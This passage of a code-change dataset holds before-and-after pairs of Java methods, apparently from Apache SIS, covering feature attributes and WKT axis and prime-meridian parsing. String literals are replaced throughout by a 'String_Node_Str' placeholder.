Float.class).setValue(...); // Set new accuracy value here as a float.}</li> </ol>
 * @return other attribute types that describes this attribute type, or an empty map if none.
 * @see DefaultAttributeType#characteristics()
 */
@Override @SuppressWarnings(""String_Node_Str"") public Map<String,Attribute<?>> characteristics(){
  if (characteristics == null) {
    characteristics=newCharacteristicsMap();
  }
  return characteristics;
}"
91905,"/** 
 * Returns the name of this attribute as defined by its   {@linkplain #getType() type}. This convenience method delegates to   {@link AttributeType#getName()}.
 * @return The attribute name specified by its type.
 */
@Override public GenericName getName(){
  return type.getName();
}","/** 
 * Returns the name of this attribute as defined by its   {@linkplain #getType() type}. This convenience method delegates to   {@link AttributeType#getName()}.
 * @return the attribute name specified by its type.
 */
@Override public GenericName getName(){
  return type.getName();
}"
91906,"/** 
 * Returns all attribute values, or an empty collection if none. The returned collection is <cite>live</cite>: changes in the returned collection will be reflected immediately in this   {@code Attribute} instance, and conversely.<p>The default implementation returns a collection which will delegate its work to {@link #getValue()} and {@link #setValue(Object)}.</p>
 * @return The attribute values in a <cite>live</cite> collection.
 */
@Override public Collection<V> getValues(){
  return super.getValues();
}","/** 
 * Returns all attribute values, or an empty collection if none. The returned collection is <cite>live</cite>: changes in the returned collection will be reflected immediately in this   {@code Attribute} instance, and conversely.<p>The default implementation returns a collection which will delegate its work to {@link #getValue()} and {@link #setValue(Object)}.</p>
 * @return the attribute values in a <cite>live</cite> collection.
 */
@Override public Collection<V> getValues(){
  return super.getValues();
}"
91907,"/** 
 * Invoked on serialization for saving the   {@link #characteristics} field.
 * @param out The output stream where to serialize this attribute.
 * @throws IOException If an I/O error occurred while writing.
 */
private void writeObject(final ObjectOutputStream out) throws IOException {
  out.defaultWriteObject();
  final Attribute<?>[] characterizedBy;
  if (characteristics instanceof CharacteristicMap) {
    characterizedBy=characteristics.values().toArray(new Attribute<?>[characteristics.size()]);
  }
 else {
    characterizedBy=null;
  }
  out.writeObject(characterizedBy);
}","/** 
 * Invoked on serialization for saving the   {@link #characteristics} field.
 * @param out  the output stream where to serialize this attribute.
 * @throws IOException if an I/O error occurred while writing.
 */
private void writeObject(final ObjectOutputStream out) throws IOException {
  out.defaultWriteObject();
  final Attribute<?>[] characterizedBy;
  if (characteristics instanceof CharacteristicMap) {
    characterizedBy=characteristics.values().toArray(new Attribute<?>[characteristics.size()]);
  }
 else {
    characterizedBy=null;
  }
  out.writeObject(characterizedBy);
}"
91908,"/** 
 * Invoked on deserialization for restoring the   {@link #characteristics} field.
 * @param in The input stream from which to deserialize an attribute.
 * @throws IOException If an I/O error occurred while reading or if the stream contains invalid data.
 * @throws ClassNotFoundException If the class serialized on the stream is not on the classpath.
 */
private void readObject(final ObjectInputStream in) throws IOException, ClassNotFoundException {
  in.defaultReadObject();
  try {
    final Attribute<?>[] characterizedBy=(Attribute<?>[])in.readObject();
    if (characterizedBy != null) {
      characteristics=newCharacteristicsMap();
      characteristics.values().addAll(Arrays.asList(characterizedBy));
    }
  }
 catch (  RuntimeException e) {
    throw (IOException)new InvalidObjectException(e.getMessage()).initCause(e);
  }
}","/** 
 * Invoked on deserialization for restoring the   {@link #characteristics} field.
 * @param in  the input stream from which to deserialize an attribute.
 * @throws IOException if an I/O error occurred while reading or if the stream contains invalid data.
 * @throws ClassNotFoundException if the class serialized on the stream is not on the classpath.
 */
private void readObject(final ObjectInputStream in) throws IOException, ClassNotFoundException {
  in.defaultReadObject();
  try {
    final Attribute<?>[] characterizedBy=(Attribute<?>[])in.readObject();
    if (characterizedBy != null) {
      characteristics=newCharacteristicsMap();
      characteristics.values().addAll(Arrays.asList(characterizedBy));
    }
  }
 catch (  RuntimeException e) {
    throw (IOException)new InvalidObjectException(e.getMessage()).initCause(e);
  }
}"
91909,"/** 
 * Evaluates the quality of this attribute at this method invocation time. The data quality reports may include information about whether the attribute value mets the constraints defined by the  {@linkplain DefaultAttributeType attribute type}, or any other criterion at implementation choice. <p>The default implementation reports data quality with at least the following information:</p> <ul> <li> The   {@linkplain org.apache.sis.metadata.iso.quality.DefaultDataQuality#getScope() scope}{@linkplain org.apache.sis.metadata.iso.quality.DefaultScope#getLevel() level} is set to{@link org.opengis.metadata.maintenance.ScopeCode#ATTRIBUTE}. </li><li> At most one   {@linkplain org.apache.sis.metadata.iso.quality.DefaultDomainConsistency domain consistency}element is added to the   {@linkplain org.apache.sis.metadata.iso.quality.DefaultDataQuality#getReports() reports} list (implementations are free to omit that element if they have nothing to report).If a report is provided, then it will contain at least the following information: <ul> <li> <p>The  {@linkplain #getName() attribute name} as the data quality{@linkplain org.apache.sis.metadata.iso.quality.DefaultDomainConsistency#getMeasureIdentification() measure identification}.</p> <div class=""note""><b>Note:</b> strictly speaking,   {@code measureIdentification} identifies the<em>quality measurement</em>, not the real measurement itself. However this implementation uses the same set of identifiers for both for simplicity.</div> </li><li> <p>If the attribute  {@linkplain #getValue() value} is not an {@linkplain Class#isInstance instance}of the expected   {@linkplain DefaultAttributeType#getValueClass() value class}, or if the number of occurrences is not inside the cardinality range, or if any other constraint is violated, then a   {@linkplain org.apache.sis.metadata.iso.quality.DefaultConformanceResult conformance result} isadded for each violation with an {@linkplain org.apache.sis.metadata.iso.quality.DefaultConformanceResult#getExplanation() explanation}set to the error message.</p> <div class=""warning""><b>Note:</b> this is a departure from ISO intend, since   {@code explanation}should be a statement about what a successful conformance means. This point may be reformulated in a future SIS version.</div> </li> </ul> </li> </ul> This attribute is valid if this method does not report any  {@linkplain org.apache.sis.metadata.iso.quality.DefaultConformanceResult conformance result} having a{@linkplain org.apache.sis.metadata.iso.quality.DefaultConformanceResult#pass() pass} value of {@code false}. <div class=""note""><b>Example:</b> given an attribute named population with [1  1] cardinality, if no value has been assigned to that attribute, then this   {@code quality()} method will returnthe following data quality report: {@preformat textData quality Scope Level Attribute Report Measure identification Code population Evaluation method type Direct internal Result Explanation Missing value for population property. Pass false}</div>
 * @return Reports on all constraint violations found.
 * @see AbstractFeature#quality()
 */
public DataQuality quality(){
  final Validator v=new Validator(ScopeCode.ATTRIBUTE);
  v.validate(type,getValues());
  return v.quality;
}","/** 
 * Evaluates the quality of this attribute at this method invocation time. The data quality reports may include information about whether the attribute value mets the constraints defined by the  {@linkplain DefaultAttributeType attribute type}, or any other criterion at implementation choice. <p>The default implementation reports data quality with at least the following information:</p> <ul> <li> The   {@linkplain org.apache.sis.metadata.iso.quality.DefaultDataQuality#getScope() scope}{@linkplain org.apache.sis.metadata.iso.quality.DefaultScope#getLevel() level} is set to{@link org.opengis.metadata.maintenance.ScopeCode#ATTRIBUTE}. </li><li> At most one   {@linkplain org.apache.sis.metadata.iso.quality.DefaultDomainConsistency domain consistency}element is added to the   {@linkplain org.apache.sis.metadata.iso.quality.DefaultDataQuality#getReports() reports} list (implementations are free to omit that element if they have nothing to report).If a report is provided, then it will contain at least the following information: <ul> <li> <p>The  {@linkplain #getName() attribute name} as the data quality{@linkplain org.apache.sis.metadata.iso.quality.DefaultDomainConsistency#getMeasureIdentification() measure identification}.</p> <div class=""note""><b>Note:</b> strictly speaking,   {@code measureIdentification} identifies the<em>quality measurement</em>, not the real measurement itself. However this implementation uses the same set of identifiers for both for simplicity.</div> </li><li> <p>If the attribute  {@linkplain #getValue() value} is not an {@linkplain Class#isInstance instance}of the expected   {@linkplain DefaultAttributeType#getValueClass() value class}, or if the number of occurrences is not inside the cardinality range, or if any other constraint is violated, then a   {@linkplain org.apache.sis.metadata.iso.quality.DefaultConformanceResult conformance result} isadded for each violation with an {@linkplain org.apache.sis.metadata.iso.quality.DefaultConformanceResult#getExplanation() explanation}set to the error message.</p> <div class=""warning""><b>Note:</b> this is a departure from ISO intend, since   {@code explanation}should be a statement about what a successful conformance means. This point may be reformulated in a future SIS version.</div> </li> </ul> </li> </ul> This attribute is valid if this method does not report any  {@linkplain org.apache.sis.metadata.iso.quality.DefaultConformanceResult conformance result} having a{@linkplain org.apache.sis.metadata.iso.quality.DefaultConformanceResult#pass() pass} value of {@code false}. <div class=""note""><b>Example:</b> given an attribute named population with [1  1] cardinality, if no value has been assigned to that attribute, then this   {@code quality()} method will returnthe following data quality report: {@preformat textData quality Scope Level Attribute Report Measure identification Code population Evaluation method type Direct internal Result Explanation Missing value for population property. Pass false}</div>
 * @return reports on all constraint violations found.
 * @see AbstractFeature#quality()
 */
public DataQuality quality(){
  final Validator v=new Validator(ScopeCode.ATTRIBUTE);
  v.validate(type,getValues());
  return v.quality;
}"
91910,"/** 
 * Returns the attribute value, or   {@code null} if none. This convenience method can be invoked inthe common case where the  {@linkplain DefaultAttributeType#getMaximumOccurs() maximum number}of attribute values is restricted to 1 or 0.
 * @return The attribute value (may be {@code null}).
 * @throws MultiValuedPropertyException if this attribute contains more than one value.
 * @see AbstractFeature#getPropertyValue(String)
 */
@Override public abstract V getValue() throws MultiValuedPropertyException ;","/** 
 * Returns the attribute value, or   {@code null} if none. This convenience method can be invoked inthe common case where the  {@linkplain DefaultAttributeType#getMaximumOccurs() maximum number}of attribute values is restricted to 1 or 0.
 * @return the attribute value (may be {@code null}).
 * @throws MultiValuedPropertyException if this attribute contains more than one value.
 * @see AbstractFeature#getPropertyValue(String)
 */
@Override public abstract V getValue() throws MultiValuedPropertyException ;"
91911,"/** 
 * Returns information about the attribute (base Java class, domain of values, <i>etc.</i>).
 * @return Information about the attribute.
 */
@Override public AttributeType<V> getType(){
  return type;
}","/** 
 * Returns information about the attribute (base Java class, domain of values, <i>etc.</i>).
 * @return information about the attribute.
 */
@Override public AttributeType<V> getType(){
  return type;
}"
91912,"/** 
 * Sets the attribute values. All previous values are replaced by the given collection. <p>The default implementation ensures that the given collection contains at most one element, then delegates to   {@link #setValue(Object)}.</p>
 * @param values The new values.
 * @throws InvalidPropertyValueException if the given collection contains too many elements.
 */
@Override public void setValues(final Collection<? extends V> values) throws InvalidPropertyValueException {
  super.setValues(values);
}","/** 
 * Sets the attribute values. All previous values are replaced by the given collection. <p>The default implementation ensures that the given collection contains at most one element, then delegates to   {@link #setValue(Object)}.</p>
 * @param values  the new values.
 * @throws InvalidPropertyValueException if the given collection contains too many elements.
 */
@Override public void setValues(final Collection<? extends V> values) throws InvalidPropertyValueException {
  super.setValues(values);
}"
91913,"/** 
 * Sets the attribute value. All previous values are replaced by the given singleton. <div class=""section"">Validation</div> The amount of validation performed by this method is implementation dependent. Usually, only the most basic constraints are verified. This is so for performance reasons and also because some rules may be temporarily broken while constructing a feature. A more exhaustive verification can be performed by invoking the   {@link #quality()} method.
 * @param value The new value, or {@code null} for removing all values from this attribute.
 * @see AbstractFeature#setPropertyValue(String,Object)
 */
@Override public abstract void setValue(final V value);","/** 
 * Sets the attribute value. All previous values are replaced by the given singleton. <div class=""section"">Validation</div> The amount of validation performed by this method is implementation dependent. Usually, only the most basic constraints are verified. This is so for performance reasons and also because some rules may be temporarily broken while constructing a feature. A more exhaustive verification can be performed by invoking the   {@link #quality()} method.
 * @param value  the new value, or {@code null} for removing all values from this attribute.
 * @throws InvalidPropertyValueException if this method verifies argument validity and the given valuedoes not met the attribute constraints.
 * @see AbstractFeature#setPropertyValue(String,Object)
 */
@Override public abstract void setValue(final V value) throws InvalidPropertyValueException ;"
91914,"/** 
 * Returns a copy of this attribute. The default implementation returns a <em>shallow</em> copy: the attribute   {@linkplain #getValue() value} and {@linkplain #characteristics() characteristics}are <strong>not</strong> cloned. However subclasses may choose to do otherwise.
 * @return A clone of this attribute.
 * @throws CloneNotSupportedException if this attribute, the {@linkplain #getValue() value}or one of its   {@linkplain #characteristics() characteristics} can not be cloned.
 */
@Override @SuppressWarnings(""String_Node_Str"") public AbstractAttribute<V> clone() throws CloneNotSupportedException {
  final AbstractAttribute<V> clone=(AbstractAttribute<V>)super.clone();
  final Map<String,Attribute<?>> c=clone.characteristics;
  if (c instanceof CharacteristicMap) {
    clone.characteristics=((CharacteristicMap)c).clone();
  }
  return clone;
}","/** 
 * Returns a copy of this attribute. The default implementation returns a <em>shallow</em> copy: the attribute   {@linkplain #getValue() value} and {@linkplain #characteristics() characteristics}are <strong>not</strong> cloned. However subclasses may choose to do otherwise.
 * @return a clone of this attribute.
 * @throws CloneNotSupportedException if this attribute, the {@linkplain #getValue() value}or one of its   {@linkplain #characteristics() characteristics} can not be cloned.
 */
@Override @SuppressWarnings(""String_Node_Str"") public AbstractAttribute<V> clone() throws CloneNotSupportedException {
  final AbstractAttribute<V> clone=(AbstractAttribute<V>)super.clone();
  final Map<String,Attribute<?>> c=clone.characteristics;
  if (c instanceof CharacteristicMap) {
    clone.characteristics=((CharacteristicMap)c).clone();
  }
  return clone;
}"
91915,"/** 
 * Creates a new attribute of the given type.
 * @param type Information about the attribute (base Java class, domain of values, <i>etc.</i>).
 * @see #create(AttributeType)
 */
protected AbstractAttribute(final AttributeType<V> type){
  this.type=type;
}","/** 
 * Creates a new attribute of the given type.
 * @param type  information about the attribute (base Java class, domain of values, <i>etc.</i>).
 * @see #create(AttributeType)
 */
protected AbstractAttribute(final AttributeType<V> type){
  this.type=type;
}"
91916,"/** 
 * Creates a new attribute of the given type initialized to the given value. Note that a   {@code null} value may not be the same as the default value.
 * @param < V >   The type of attribute values.
 * @param type  Information about the attribute (base Java class, domain of values, <i>etc.</i>).
 * @param value The initial value (may be {@code null}).
 * @return The new attribute.
 */
static <V>AbstractAttribute<V> create(final AttributeType<V> type,final Object value){
  ArgumentChecks.ensureNonNull(""String_Node_Str"",type);
  return isSingleton(type.getMaximumOccurs()) ? new SingletonAttribute<>(type,value) : new MultiValuedAttribute<>(type,value);
}","/** 
 * Creates a new attribute of the given type initialized to the given value. Note that a   {@code null} value may not be the same as the default value.
 * @param < V >    the type of attribute values.
 * @param type   information about the attribute (base Java class, domain of values, <i>etc.</i>).
 * @param value  the initial value (may be {@code null}).
 * @return The new attribute.
 */
static <V>AbstractAttribute<V> create(final AttributeType<V> type,final Object value){
  ArgumentChecks.ensureNonNull(""String_Node_Str"",type);
  return isSingleton(type.getMaximumOccurs()) ? new SingletonAttribute<>(type,value) : new MultiValuedAttribute<>(type,value);
}"
91917,"/** 
 * Returns a string representation of this attribute. The returned string is for debugging purpose and may change in any future SIS version. The current implementation is like below:  {@preformat text}Attribute[temperature : Float] =  20.3, 17.8, 21.1}  characteristics: units=C, accuracy=0.1 }
 * @return A string representation of this attribute for debugging purpose.
 */
@Debug @Override public String toString(){
  final StringBuilder buffer=FieldType.toString(""String_Node_Str"",type,Classes.getShortName(type.getValueClass()),getValues().iterator());
  if (characteristics != null && !characteristics.isEmpty()) {
    buffer.append(System.lineSeparator());
    String separator=""String_Node_Str"";
    for (    final Map.Entry<String,Attribute<?>> entry : characteristics.entrySet()) {
      buffer.append(separator).append(entry.getKey()).append('=').append(entry.getValue().getValue());
      separator=""String_Node_Str"";
    }
  }
  return buffer.toString();
}","/** 
 * Returns a string representation of this attribute. The returned string is for debugging purpose and may change in any future SIS version. The current implementation is like below:  {@preformat text}Attribute[temperature : Float] =  20.3, 17.8, 21.1}  characteristics: units=C, accuracy=0.1 }
 * @return a string representation of this attribute for debugging purpose.
 */
@Debug @Override public String toString(){
  final StringBuilder buffer=FieldType.toString(""String_Node_Str"",type,Classes.getShortName(type.getValueClass()),getValues().iterator());
  if (characteristics != null && !characteristics.isEmpty()) {
    buffer.append(System.lineSeparator());
    String separator=""String_Node_Str"";
    for (    final Map.Entry<String,Attribute<?>> entry : characteristics.entrySet()) {
      buffer.append(separator).append(entry.getKey()).append('=').append(entry.getValue().getValue());
      separator=""String_Node_Str"";
    }
  }
  return buffer.toString();
}"
91918,"/** 
 * Given a concatenated string as produced by   {@link #getValue()}, separates the components around the separator and forward the values to the original attributes. If one of the values can not be parsed, then this method does not store any property value (""all or nothing"" behavior).
 * @param value  the concatenated string.
 * @throws UnconvertibleObjectException if one of the attribute values can not be parsed to the expected type.
 */
@Override public void setValue(final String value) throws UnconvertibleObjectException {
}","/** 
 * Given a concatenated string as produced by   {@link #getValue()}, separates the components around the separator and forward the values to the original attributes. If one of the values can not be parsed, then this method does not store any property value (""all or nothing"" behavior).
 * @param value  the concatenated string.
 * @throws InvalidPropertyValueException if one of the attribute values can not be parsed to the expected type.
 */
@Override public void setValue(final String value) throws InvalidPropertyValueException {
}"
91919,"/** 
 * Creates a feature type with an string join operation. The feature contains the following properties: <ul> <li>  {@code name} as a {@link String}</li> <li>  {@code age} as an {@link Integer}</li> <li>  {@code summary} as string join of {@code name} and {@code age} attributes.</li></ul>
 * @return The feature for a person.
 */
private static DefaultFeatureType person(){
  final PropertyType nameType=new DefaultAttributeType<>(name(""String_Node_Str""),String.class,1,1,null);
  final PropertyType ageType=new DefaultAttributeType<>(name(""String_Node_Str""),Integer.class,1,1,null);
  final PropertyType cmpType=FeatureOperations.compound(name(""String_Node_Str""),""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",nameType,ageType);
  return new DefaultFeatureType(name(""String_Node_Str""),false,null,nameType,ageType,cmpType);
}","/** 
 * Creates a feature type with an string join operation. The feature contains the following properties: <ul> <li>  {@code name} as a {@link String}</li> <li>  {@code age} as an {@link Integer}</li> <li>  {@code summary} as string join of {@code name} and {@code age} attributes.</li></ul> The operation uses  {@code ""<<:""} and {@code "":>>""} as prefix and suffix respectivelyavoid avoiding confusion if a code spelled the variable name (e.g.  {@code prefix}) instead of using it.
 * @return The feature for a person.
 */
private static DefaultFeatureType person(){
  final PropertyType nameType=new DefaultAttributeType<>(name(""String_Node_Str""),String.class,1,1,null);
  final PropertyType ageType=new DefaultAttributeType<>(name(""String_Node_Str""),Integer.class,1,1,null);
  final PropertyType cmpType=FeatureOperations.compound(name(""String_Node_Str""),""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",nameType,ageType);
  return new DefaultFeatureType(name(""String_Node_Str""),false,null,nameType,ageType,cmpType);
}"
91920,"/** 
 * Reports a non-fatal warning that occurred while parsing a WKT.
 * @param message The message. Can not be {@code null}.
 * @param ex      The non-fatal exception that occurred while parsing the element, or {@code null}.
 */
final void warning(final InternationalString message,final Exception ex){
  if (warnings == null) {
    warnings=new Warnings(errorLocale,true,ignoredElements);
  }
  warnings.add(message,ex,null);
}","/** 
 * Reports a non-fatal warning that occurred while parsing a WKT.
 * @param parent  The parent element, or {@code null} if unknown.
 * @param element The element that we can not parse, or {@code null} if unknown.
 * @param message The message. Can be {@code null} only if {@code ex} is non-null.
 * @param ex      The non-fatal exception that occurred while parsing the element, or {@code null}.
 */
final void warning(final Element parent,final Element element,final InternationalString message,final Exception ex){
  if (warnings == null) {
    warnings=new Warnings(errorLocale,true,ignoredElements);
  }
  warnings.add(message,ex,(parent != null && element != null) ? new String[]{parent.keyword,element.keyword} : null);
}"
91921,"/** 
 * Parses an   {@code ""AXIS""} element.This element has the following pattern (simplified): {@preformat textAXIS[""<name (abbr.)>"", NORTH | SOUTH | EAST | WEST | UP | DOWN | OTHER, ORDER[n], UNIT[], ID[]]}
 * @param mode        {@link #FIRST},   {@link #OPTIONAL} or {@link #MANDATORY}.
 * @param parent      The parent element.
 * @param csType      The coordinate system type (Cartesian | ellipsoidal | vertical | etc), or nullif unknown.
 * @param defaultUnit The contextual unit (usually {@code SI.METRE} or {@code SI.RADIAN}), or   {@code null} if unknown.
 * @return The {@code ""AXIS""} element as a {@link CoordinateSystemAxis} object, or {@code null}if the axis was not required and there is no axis object.
 * @throws ParseException if the {@code ""AXIS""} element can not be parsed.
 */
private CoordinateSystemAxis parseAxis(final int mode,final Element parent,final String csType,final Unit<?> defaultUnit) throws ParseException {
  final Element element=parent.pullElement(mode,WKTKeywords.Axis);
  if (element == null) {
    return null;
  }
  String name=element.pullString(""String_Node_Str"");
  final Element orientation=element.pullVoidElement(""String_Node_Str"");
  Unit<?> unit=parseUnit(element);
  if (unit == null) {
    if (defaultUnit == null) {
      throw element.missingComponent(WKTKeywords.Unit);
    }
    unit=defaultUnit;
  }
  AxisDirection direction=Types.forCodeName(AxisDirection.class,orientation.keyword,true);
  final Element meridian=element.pullElement(OPTIONAL,WKTKeywords.Meridian);
  if (meridian != null) {
    double angle=meridian.pullDouble(""String_Node_Str"");
    final Unit<Angle> m=parseScaledUnit(meridian,WKTKeywords.AngleUnit,SI.RADIAN);
    meridian.close(ignoredElements);
    if (m != null) {
      angle=m.getConverterTo(NonSI.DEGREE_ANGLE).convert(angle);
    }
    direction=referencing.directionAlongMeridian(direction,angle);
  }
  String abbreviation;
  final int start, end=name.length() - 1;
  if (end > 1 && name.charAt(end) == ')' && (start=name.lastIndexOf('(',end - 1)) >= 0) {
    abbreviation=CharSequences.trimWhitespaces(name.substring(start + 1,end));
    name=CharSequences.trimWhitespaces(name.substring(0,start));
    if (name.isEmpty()) {
      name=abbreviation;
    }
  }
 else {
    abbreviation=AxisDirections.suggestAbbreviation(name,direction,unit);
  }
  name=transliterator.toLongAxisName(csType,direction,name);
  abbreviation=transliterator.toUnicodeAbbreviation(csType,direction,abbreviation);
  final Element order=element.pullElement(OPTIONAL,WKTKeywords.Order);
  Integer n=null;
  if (order != null) {
    n=order.pullInteger(""String_Node_Str"");
    order.close(ignoredElements);
  }
  final CoordinateSystemAxis axis;
  try {
    axis=csFactory.createCoordinateSystemAxis(parseMetadataAndClose(element,name,null),abbreviation,direction,unit);
  }
 catch (  FactoryException exception) {
    throw element.parseFailed(exception);
  }
  if (axisOrder.put(axis,n) != null) {
    throw new LocalizedParseException(errorLocale,Errors.Keys.DuplicatedElement_1,new Object[]{WKTKeywords.Axis + ""String_Node_Str"" + name+ ""String_Node_Str""},element.offset);
  }
  return axis;
}","/** 
 * Parses an   {@code ""AXIS""} element.This element has the following pattern (simplified): {@preformat wktAXIS[""<name (abbr.)>"", NORTH | SOUTH | EAST | WEST | UP | DOWN | OTHER, ORDER[n], UNIT[], ID[]]}Abbreviation may be specified between parenthesis. Nested parenthesis are possible, as for example:  {@preformat wktAXIS[""Easting (E(X))"", EAST]}
 * @param mode        {@link #FIRST},   {@link #OPTIONAL} or {@link #MANDATORY}.
 * @param parent      The parent element.
 * @param csType      The coordinate system type (Cartesian | ellipsoidal | vertical | etc), or nullif unknown.
 * @param defaultUnit The contextual unit (usually {@code SI.METRE} or {@code SI.RADIAN}), or   {@code null} if unknown.
 * @return The {@code ""AXIS""} element as a {@link CoordinateSystemAxis} object, or {@code null}if the axis was not required and there is no axis object.
 * @throws ParseException if the {@code ""AXIS""} element can not be parsed.
 */
private CoordinateSystemAxis parseAxis(final int mode,final Element parent,final String csType,final Unit<?> defaultUnit) throws ParseException {
  final Element element=parent.pullElement(mode,WKTKeywords.Axis);
  if (element == null) {
    return null;
  }
  String name=element.pullString(""String_Node_Str"");
  final Element orientation=element.pullVoidElement(""String_Node_Str"");
  Unit<?> unit=parseUnit(element);
  if (unit == null) {
    if (defaultUnit == null) {
      throw element.missingComponent(WKTKeywords.Unit);
    }
    unit=defaultUnit;
  }
  AxisDirection direction=Types.forCodeName(AxisDirection.class,orientation.keyword,true);
  final Element meridian=element.pullElement(OPTIONAL,WKTKeywords.Meridian);
  if (meridian != null) {
    double angle=meridian.pullDouble(""String_Node_Str"");
    final Unit<Angle> m=parseScaledUnit(meridian,WKTKeywords.AngleUnit,SI.RADIAN);
    meridian.close(ignoredElements);
    if (m != null) {
      angle=m.getConverterTo(NonSI.DEGREE_ANGLE).convert(angle);
    }
    direction=referencing.directionAlongMeridian(direction,angle);
  }
  String abbreviation;
  int start, end=name.length() - 1;
  if (end > 1 && name.charAt(end) == ')' && (start=name.lastIndexOf('(',end - 1)) >= 0) {
    for (int np=end; (--np >= 0) && name.charAt(np) == ')'; ) {
      final int c=name.lastIndexOf('(',start - 1);
      if (c < 0) {
        warning(parent,element,Errors.formatInternational(Errors.Keys.NonEquilibratedParenthesis_2,'(',name),null);
        break;
      }
      start=c;
    }
    abbreviation=CharSequences.trimWhitespaces(name.substring(start + 1,end));
    name=CharSequences.trimWhitespaces(name.substring(0,start));
    if (name.isEmpty()) {
      name=abbreviation;
    }
  }
 else {
    abbreviation=AxisDirections.suggestAbbreviation(name,direction,unit);
  }
  name=transliterator.toLongAxisName(csType,direction,name);
  abbreviation=transliterator.toUnicodeAbbreviation(csType,direction,abbreviation);
  final Element order=element.pullElement(OPTIONAL,WKTKeywords.Order);
  Integer n=null;
  if (order != null) {
    n=order.pullInteger(""String_Node_Str"");
    order.close(ignoredElements);
  }
  final CoordinateSystemAxis axis;
  try {
    axis=csFactory.createCoordinateSystemAxis(parseMetadataAndClose(element,name,null),abbreviation,direction,unit);
  }
 catch (  FactoryException exception) {
    throw element.parseFailed(exception);
  }
  if (axisOrder.put(axis,n) != null) {
    throw new LocalizedParseException(errorLocale,Errors.Keys.DuplicatedElement_1,new Object[]{WKTKeywords.Axis + ""String_Node_Str"" + name+ ""String_Node_Str""},element.offset);
  }
  return axis;
}"
91922,"/** 
 * Parses a   {@code ""PrimeMeridian""} element. The syntax is given by<a href=""http://docs.opengeospatial.org/is/12-063r5/12-063r5.html#53"">WKT 2 specification 8.2.2</a>. The legacy WKT 1 pattern was: {@preformat text}PRIMEM[""<name>"", <longitude>  ,<authority>}] }
 * @param mode        {@link #FIRST},   {@link #OPTIONAL} or {@link #MANDATORY}.
 * @param parent      The parent element.
 * @param isWKT1      {@code true} if this method is invoked while parsing a WKT 1 element.
 * @param angularUnit The contextual unit.
 * @return The {@code ""PrimeMeridian""} element as a {@link PrimeMeridian} object.
 * @throws ParseException if the {@code ""PrimeMeridian""} element can not be parsed.
 * @see org.apache.sis.referencing.datum.DefaultPrimeMeridian#formatTo(Formatter)
 */
private PrimeMeridian parsePrimeMeridian(final int mode,final Element parent,final boolean isWKT1,Unit<Angle> angularUnit) throws ParseException {
  if (isWKT1 && usesCommonUnits) {
    angularUnit=NonSI.DEGREE_ANGLE;
  }
  final Element element=parent.pullElement(mode,WKTKeywords.PrimeMeridian,WKTKeywords.PrimeM);
  if (element == null) {
    return null;
  }
  final String name=element.pullString(""String_Node_Str"");
  final double longitude=element.pullDouble(""String_Node_Str"");
  final Unit<Angle> unit=parseScaledUnit(element,WKTKeywords.AngleUnit,SI.RADIAN);
  if (unit != null) {
    angularUnit=unit;
  }
 else   if (angularUnit == null) {
    throw parent.missingComponent(WKTKeywords.AngleUnit);
  }
  try {
    return datumFactory.createPrimeMeridian(parseMetadataAndClose(element,name,null),longitude,angularUnit);
  }
 catch (  FactoryException exception) {
    throw element.parseFailed(exception);
  }
}","/** 
 * Parses a   {@code ""PrimeMeridian""} element. The syntax is given by<a href=""http://docs.opengeospatial.org/is/12-063r5/12-063r5.html#53"">WKT 2 specification 8.2.2</a>. The legacy WKT 1 pattern was: {@preformat wkt}PRIMEM[""<name>"", <longitude>  ,<authority>}] }
 * @param mode        {@link #FIRST},   {@link #OPTIONAL} or {@link #MANDATORY}.
 * @param parent      The parent element.
 * @param isWKT1      {@code true} if this method is invoked while parsing a WKT 1 element.
 * @param angularUnit The contextual unit.
 * @return The {@code ""PrimeMeridian""} element as a {@link PrimeMeridian} object.
 * @throws ParseException if the {@code ""PrimeMeridian""} element can not be parsed.
 * @see org.apache.sis.referencing.datum.DefaultPrimeMeridian#formatTo(Formatter)
 */
private PrimeMeridian parsePrimeMeridian(final int mode,final Element parent,final boolean isWKT1,Unit<Angle> angularUnit) throws ParseException {
  if (isWKT1 && usesCommonUnits) {
    angularUnit=NonSI.DEGREE_ANGLE;
  }
  final Element element=parent.pullElement(mode,WKTKeywords.PrimeMeridian,WKTKeywords.PrimeM);
  if (element == null) {
    return null;
  }
  final String name=element.pullString(""String_Node_Str"");
  final double longitude=element.pullDouble(""String_Node_Str"");
  final Unit<Angle> unit=parseScaledUnit(element,WKTKeywords.AngleUnit,SI.RADIAN);
  if (unit != null) {
    angularUnit=unit;
  }
 else   if (angularUnit == null) {
    throw parent.missingComponent(WKTKeywords.AngleUnit);
  }
  try {
    return datumFactory.createPrimeMeridian(parseMetadataAndClose(element,name,null),longitude,angularUnit);
  }
 catch (  FactoryException exception) {
    throw element.parseFailed(exception);
  }
}"
91923,"/** 
 * Parses an   {@code ""ImageCRS""} (WKT 2) element. The syntax is given by<a href=""http://docs.opengeospatial.org/is/12-063r5/12-063r5.html#79"">WKT 2 specification 12</a>.
 * @param mode {@link #FIRST},   {@link #OPTIONAL} or {@link #MANDATORY}.
 * @param parent The parent element.
 * @return The {@code ""ImageCRS""} element as an {@link ImageCRS} object.
 * @throws ParseException if the {@code ""ImageCRS""} element can not be parsed.
 */
private ImageCRS parseImageCRS(final int mode,final Element parent) throws ParseException {
  final Element element=parent.pullElement(mode,WKTKeywords.ImageCRS);
  if (element == null) {
    return null;
  }
  final String name=element.pullString(""String_Node_Str"");
  final ImageDatum datum=parseImageDatum(MANDATORY,element);
  final Unit<?> unit=parseUnit(element);
  final CoordinateSystem cs;
  try {
    cs=parseCoordinateSystem(element,WKTKeywords.Cartesian,2,false,unit,datum);
    final Map<String,?> properties=parseMetadataAndClose(element,name,datum);
    if (cs instanceof CartesianCS) {
      return crsFactory.createImageCRS(properties,datum,(CartesianCS)cs);
    }
  }
 catch (  FactoryException exception) {
    throw element.parseFailed(exception);
  }
  throw element.illegalCS(cs);
}","/** 
 * Parses an   {@code ""ImageCRS""} (WKT 2) element. The syntax is given by<a href=""http://docs.opengeospatial.org/is/12-063r5/12-063r5.html#79"">WKT 2 specification 12</a>.
 * @param mode {@link #FIRST},   {@link #OPTIONAL} or {@link #MANDATORY}.
 * @param parent The parent element.
 * @return The {@code ""ImageCRS""} element as an {@link ImageCRS} object.
 * @throws ParseException if the {@code ""ImageCRS""} element can not be parsed.
 */
private ImageCRS parseImageCRS(final int mode,final Element parent) throws ParseException {
  final Element element=parent.pullElement(mode,WKTKeywords.ImageCRS);
  if (element == null) {
    return null;
  }
  final String name=element.pullString(""String_Node_Str"");
